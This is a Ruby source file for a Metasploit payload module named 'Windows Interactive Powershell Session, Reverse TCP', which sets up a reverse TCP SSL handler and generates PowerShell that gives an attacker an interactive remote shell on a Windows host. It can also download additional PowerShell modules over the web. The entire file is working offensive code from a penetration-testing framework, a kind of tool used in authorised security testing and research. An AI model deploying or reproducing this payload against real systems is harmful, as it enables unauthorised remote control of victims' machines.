##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/payload/windows/exec'
require 'msf/core/payload/windows/powershell'
require 'msf/base/sessions/powershell'
require 'msf/core/handler/reverse_tcp_ssl'

###
#
# Extends the Exec payload to add a new user.
#
###
module MetasploitModule

  CachedSize = 1746

  include Msf::Payload::Windows::Exec
  include Msf::Payload::Windows::Powershell
  include Rex::Powershell::Command

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Windows Interactive Powershell Session, Reverse TCP',
      'Description'   => 'Listen for a connection and spawn an interactive powershell session',
      'Author'        =>
        [
          'Ben Turner', # benpturner
          'Dave Hardy' # davehardy20
        ],
      'References'    =>
        [
          ['URL', 'https://www.nettitude.co.uk/interactive-powershell-session-via-metasploit/']
        ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcpSsl,
      'Session'       => Msf::Sessions::PowerShell,
      ))

    # Register command execution options
    register_options(
      [
        OptString.new('LOAD_MODULES', [ false, "A list of powershell modules seperated by a comma to download over the web", nil ]),
      ])
    # Hide the CMD option...this is kinda ugly
    deregister_options('CMD')
  end

  #
  # Override the exec command string
  #
  def powershell_command
    generate_powershell_code("Reverse")
  end
end
